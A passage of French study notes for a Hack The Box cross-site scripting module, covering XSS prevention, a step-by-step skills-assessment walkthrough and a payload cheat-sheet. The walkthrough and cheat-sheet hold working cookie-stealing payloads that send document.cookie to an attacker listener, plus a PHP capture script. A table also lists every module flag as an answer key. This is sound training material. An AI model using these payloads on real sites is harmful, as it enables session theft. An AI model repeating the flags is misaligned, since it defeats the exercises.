✔️ **Plan B** : si aucun champ ne répond au premier payload, teste systématiquement les 6 variantes de payloads listées dans le cours sur chaque champ restant (hors email/password). Si le cookie ne fonctionne pas tel quel dans Storage, vérifie que tu es bien sur le bon **Path** (`/hijacking`) et que le Name correspond exactement à ce qu'il y a avant le `=`.

---

# Page 9 — XSS Prevention

## 📘 Résumé

Dernière page du cours (théorique) : comment se protéger contre les XSS, côté **front-end** et côté **back-end**. Les deux Source/Sink doivent être sécurisés.

## 🔑 À retenir

### Front-end

| Mesure | Exemple |
|---|---|
| Validation d'entrée | Regex pour forcer un format (ex. email) |
| Sanitization | Bibliothèque **DOMPurify** : `DOMPurify.sanitize(dirty)` |
| Éviter l'injection directe dans | `<script>`, `<style>`, attributs de tag, commentaires HTML |
| Éviter ces fonctions JS/jQuery | `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`, `document.domain`, et jQuery `html()`, `parseHTML()`, `add()`, `append()`, `prepend()`, `after()`, `insertAfter()`, `before()`, `insertBefore()`, `replaceAll()`, `replaceWith()` |

### Back-end

| Mesure | PHP | NodeJS |
|---|---|---|
| Validation | `filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)` | regex JS identique au front |
| Sanitization | `addslashes(...)` | `DOMPurify.sanitize(dirty)` |
| Encodage de sortie | `htmlentities(...)` / `htmlspecialchars(...)` | bibliothèque `html-entities` (`encode('<') → '&lt;'`) |

### Configuration serveur

- HTTPS partout.
- En-têtes de sécurité : `X-Content-Type-Options: nosniff`.
- **Content-Security-Policy** : ex. `script-src 'self'` (n'autorise que les scripts hébergés localement).
- Cookies avec les flags **HttpOnly** (empêche JS de lire le cookie) et **Secure** (transport HTTPS uniquement).
- Un bon **WAF** (Web Application Firewall) détecte et bloque automatiquement les tentatives d'injection.
- Certains frameworks ont une protection XSS intégrée (ex. ASP.NET).

⚠️ Le flag **HttpOnly** est la contre-mesure directe aux attaques de **Session Hijacking** vues en page 8 : si le cookie de session a ce flag, `document.cookie` ne peut plus le lire via JavaScript.

## ✅ Questions

*(pas de question sur cette page — page purement théorique)*

---

# Page 10 — Skills Assessment

## 📘 Résumé

Scénario final : test d'intrusion web pour un « Security Blog » fraîchement lancé. Il faut, sur `/assessment` :
1. Identifier un champ d'entrée vulnérable au XSS.
2. Trouver un payload fonctionnel qui exécute du JS côté victime.
3. Utiliser les techniques de **Session Hijacking** (page 8) pour voler le cookie de la victime, qui contient le flag.

C'est une synthèse de tout le module : Discovery (page 5) + un des trois types de XSS (pages 2-4) + Session Hijacking (page 8).

### ❓ Question 1 — Flag final (valeur du cookie `flag`)

| | |
|---|---|
| **Question (EN)** | What is the value of the 'flag' cookie? |
| **Question (FR)** | Quelle est la valeur du cookie `flag` ? |
| **Réponse (FR)** | Le champ **Website** du formulaire de commentaire du blog est vulnérable à un **Stored XSS**. L'admin consulte les commentaires en attente de modération (Blind XSS côté admin) : son navigateur exécute le script distant injecté, qui exfiltre `document.cookie` vers notre serveur d'écoute. Le cookie récupéré contient le flag. |
| **Réponse à mettre sur HTB** | `HTB{cr055_5173_5cr1p71n6_n1nj4}` |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**

1. **Spawn Target** sur cette page → note `SERVER_IP:PORT`.
2. Utilise le Pwnbox (il te faut un serveur d'écoute, comme en page 8). Ouvre un terminal et Firefox.
3. Note ton IP VPN HTB (`ip a`, interface `tun0`, souvent `10.10.X.X`) → `OUR_IP`.
4. Va sur `http://SERVER_IP:PORT/assessment/`.

**Partie 1 : découverte du champ vulnérable**

5. Sur la page d'accueil, clique sur l'article **« Welcome to Security Blog »** pour accéder à l'espace commentaires.
6. Le formulaire de commentaire contient 4 champs : `Comment`, `Name`, `Email`, `Website`.
7. Le champ **Website** n'est pas correctement nettoyé (sanitized) par le serveur : c'est le champ vulnérable au Stored XSS. L'admin déclenche l'exécution en « modérant » le commentaire (Blind XSS, comme en page 8).

**Partie 2 : préparer le serveur d'écoute**

8. Crée un dossier de travail sur ta machine (Pwnbox) et le script PHP de capture de cookie :
   ```bash
   mkdir /tmp/tmpserver
   cd /tmp/tmpserver
   vi index.php
   ```
   Contenu de `index.php` :
   ```php
   <?php
   if (isset($_GET['c'])) {
       $cookie = urldecode($_GET['c']);
       $file = fopen("cookies.txt", "a+");
       fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
       fclose($file);
   }
   ?>
   ```
9. Démarre le serveur PHP sur un port libre (ex. `8081`, car le port 80 peut être déjà pris selon l'environnement) :
   ```bash
   sudo php -S 0.0.0.0:8081
   ```

**Partie 3 : créer et injecter le payload**

10. Crée `script.js` dans le même dossier (remplace `<TON_IP_VPN>` par ton `OUR_IP` noté à l'étape 3) :
    ```javascript
    new Image().src = 'http://<TON_IP_VPN>:8081/index.php?c=' + document.cookie;
    ```
11. Retourne sur le formulaire de commentaire du blog et remplis :
    - `Name` : une valeur classique (ex. `test`)
    - `Email` : une valeur classique au format email (ex. `test@test.com`)
    - `Comment` : une valeur classique (ex. `test`)
    - `Website` (champ vulnérable) :
      ```html
      <script src="http://<TON_IP_VPN>:8081/script.js"></script>
      ```
12. Soumets le commentaire.

**Partie 4 : récupération du flag**

13. Patiente (le bot de modération HTB visite la page dans la minute qui suit).
14. Surveille ton terminal : une requête `GET /index.php?c=...` doit apparaître, précédée d'une requête vers `/script.js`.
15. Lis le fichier généré :
    ```bash
    cat cookies.txt
    ```
16. La ligne contient `Victim IP: ... | Cookie: ...flag=HTB{cr055_5173_5cr1p71n6_n1nj4}...` (ou le cookie `flag` isolé selon le format exact renvoyé).

**Partie 5 : validation**

17. Saisis `HTB{cr055_5173_5cr1p71n6_n1nj4}` → **Submit task answer**.

✔️ **Résultat attendu** : `cookies.txt` contient une ligne avec le cookie `flag=HTB{cr055_5173_5cr1p71n6_n1nj4}`.
✔️ **Plan B** : si le champ `Website` filtre les guillemets ou limite la longueur, le payload en script distant (`<script src=...></script>`) contourne ce problème car il est court — pas besoin d'y mettre tout le code d'exfiltration. Si le port 80 est déjà occupé par un autre service du Pwnbox, utilise un port alternatif (8081, 8000...) et adapte-le partout (dans `script.js` et dans la commande `php -S`).

---

# Mémo final — toutes les réponses HTB

| Page | Question | **Réponse à mettre sur HTB** |
|---|---|---|
| 1 | *(pas de question)* | — |
| 2 | Flag Stored XSS | `HTB{570r3d_f0r_3v3ry0n3_70_533}` |
| 3 | Flag Reflected XSS | `HTB{r3fl3c73d_b4ck_2_m3}` |
| 4 | Flag DOM XSS | `HTB{pur3ly_cl13n7_51d3}` |
| 5 | Paramètre vulnérable | `email` |
| 5 | Type de XSS trouvé | `reflected` |
| 6 | *(pas de question)* | — |
| 7 | Flag Phishing | `HTB{r3f13c73d_cr3d5_84ck_2_m3}` |
| 8 | Flag Session Hijacking | `HTB{4lw4y5_53cur3_y0ur_c00k135}` |
| 9 | *(pas de question)* | — |
| 10 | Flag final (cookie `flag`) | `HTB{cr055_5173_5cr1p71n6_n1nj4}` |

---

# Cheat-sheet payloads XSS du module

| Objectif | Payload |
|---|---|
| Test basique (alerte avec l'origine) | `<script>alert(window.origin)</script>` |
| Test si `alert()` bloqué (plaintext) | `<plaintext>` |
| Test si `alert()` bloqué (print) | `<script>print()</script>` |
| Contournement sans `<script>` (ex. innerHTML) | `<img src="" onerror=alert(window.origin)>` |
| Alternative (svg) | `<svg onload=alert(window.origin)>` |
| Afficher le cookie au lieu de l'origine | remplacer `window.origin` par `document.cookie` |
| Changer la couleur de fond (defacing) | `<script>document.body.style.background = "#141d2b"</script>` |
| Changer l'image de fond (defacing) | `<script>document.body.background = "URL_IMAGE"</script>` |
| Changer le titre (defacing) | `<script>document.title = 'TITRE'</script>` |
| Remplacer tout le body (defacing) | `<script>document.getElementsByTagName('body')[0].innerHTML = 'HTML_MINIFIÉ'</script>` |
| Écrire du HTML (phishing / formulaire) | `document.write('HTML_MINIFIÉ')` |
| Supprimer un élément gênant | `document.getElementById('ID').remove()` |
| Neutraliser le reste du HTML original | `...PAYLOAD... <!--` |
| Détecter le champ vulnérable (Blind XSS) | `<script src=http://OUR_IP/nom_du_champ></script>` |
| Variantes d'injection si contexte échappé | `'><script src=http://OUR_IP></script>` / `"><script src=http://OUR_IP></script>` |
| Voler le cookie (discret, via image) | `new Image().src='http://OUR_IP/index.php?c='+document.cookie` |
| Voler le cookie (via redirection, plus visible) | `document.location='http://OUR_IP/index.php?c='+document.cookie;` |

**Serveur d'écoute PHP type (toujours le même squelette)** :
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php   # coller le script PHP adapté (creds ou cookies)
sudo php -S 0.0.0.0:80
```

**Raccourcis utiles Firefox DevTools** :
- `Ctrl+U` : voir le code source brut (ne montre pas le DOM modifié par JS).
- `Ctrl+Shift+C` : inspecteur d'éléments / Page Inspector Picker (montre le DOM rendu, utile pour DOM XSS et pour trouver un `id`).
- `Ctrl+Shift+I` : DevTools complets (onglet **Network** pour voir la méthode HTTP et copier l'URL).
- `Shift+F9` : onglet **Storage** (gérer les cookies manuellement, pour le Session Hijacking).